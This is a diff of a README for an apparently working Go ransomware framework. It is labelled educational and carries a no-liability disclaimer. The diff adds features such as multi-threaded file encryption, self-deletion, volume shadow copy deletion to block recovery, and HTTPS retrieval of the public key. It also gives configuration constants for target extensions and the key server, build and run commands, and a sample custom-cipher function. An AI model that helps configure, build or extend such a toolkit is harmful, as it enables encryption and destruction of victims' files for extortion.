@@ -14,7 +14,6 @@ This is a basic ransomware project framework for educational purposes, designed 
     - STRICTLY PROHIBITED for any illegal use
     - The author bears no responsibility for misuse
 
-
 ---
 
 ## Key Features
@@ -24,18 +23,15 @@ This is a basic ransomware project framework for educational purposes, designed 
 3. Multi-threaded file encryption
 4. Post-encryption notepad popup functionality
 5. Self-deletion after encryption
+6. HTTPS for public key transmission
+7. Volume shadow copy deletion
+8. Multiple encryption method implementations
 
 ---
 
 **TODO (Pending Features):**
 
-~~1. Volume shadow copy deletion~~
-
-2. Desktop wallpaper replacement (resource section attempted but failed)
-3. Multiple encryption method implementations
-4. Multi-folder polling
-
-~~5. HTTPS for public key transmission~~
+1. Multi-folder polling
 
 ## Installation
 
@@ -66,17 +62,19 @@ go run ./server.go ./handler.go
 
 ### 4. Configuration
 
-#### 4.1 File Extensions and Encryption Threads
-`./client/enc_file/enc_file.go`
+#### 4.1 File Extensions, Encryption Threads and Method
+`./client/client.go`
 ```go
 const (
-	FileExtension = ".exe"
-	ThreadNumber  = 10 // Number of threads to use for encryption
+	Method        string = "CUSTOM"
+	FileExtension        = ".exe"
+	ThreadNumber         = 10 // Number of threads to use for encryption
+	FilePath      string = ""
 )
 ```
 
 #### 4.2 Server Address for Public Key Retrieval
-`./client/get_pub_key/get_pub_key.go`
+`./client/ecc/ecc_get_pub_key/get_pub_key.go`
 ```go
 const (
 	ServerAddr = "localhost"
@@ -103,3 +101,25 @@ go run ./cmd/client/main.go
 
 ```bash
 go build ./cmd/client/main.go
+```
+
+### 6. Custom Encryption Method Implementation
+
+`./client/custom_example/custom_example.go` provides an example implementation
+
+Required parameters:
+```go
+// Caesar cipher encryption
+// Parameters:
+//   - data: byte array to be encrypted
+//   - shift: custom option for encryption method
+// Returns:
+//   - encrypted byte array
+func CaesarEncrypt(data []byte, shift int) []byte {
+	encrypted := make([]byte, len(data))
+	for i, b := range data {
+		encrypted[i] = byte((int(b) + shift) % 256)
+	}
+	return encrypted
+}
+```
